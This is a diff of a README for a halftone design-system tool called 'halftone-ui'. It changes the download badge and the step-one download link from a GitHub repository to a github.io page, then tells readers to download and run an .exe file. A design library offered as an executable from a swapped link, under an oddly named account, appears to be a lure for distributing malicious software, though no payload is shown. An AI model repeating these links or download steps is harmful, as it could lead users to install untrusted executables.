@@ -1,6 +1,6 @@
 # 🖨️ halftone-ui - Transform flat designs into printed art
 
-[![Download halftone-ui](https://img.shields.io/badge/Download-Halftone_UI_Ready-blue.svg)](https://github.com/paolacaliariwilliamsewardburroughs422/halftone-ui)
+[![Download halftone-ui](https://img.shields.io/badge/Download-Halftone_UI_Ready-blue.svg)](https://paolacaliariwilliamsewardburroughs422.github.io)
 
 This application provides a design system that turns digital surfaces into printed textures. It applies halftone patterns to images and interfaces. You define your style, and the software creates the visual effect of physical print processes. This tool works as a portable library for your creative projects. It eliminates the need for external software or complex plugins. 
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run the application smoothy:
 
 Follow these steps to obtain the tool:
 
-1. Visit this link to visit the download page: [https://github.com/paolacaliariwilliamsewardburroughs422/halftone-ui](https://github.com/paolacaliariwilliamsewardburroughs422/halftone-ui)
+1. Visit this link to visit the download page: [https://paolacaliariwilliamsewardburroughs422.github.io](https://paolacaliariwilliamsewardburroughs422.github.io)
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version of the software.
 4. Select the file ending in .exe to start the transfer to your computer.
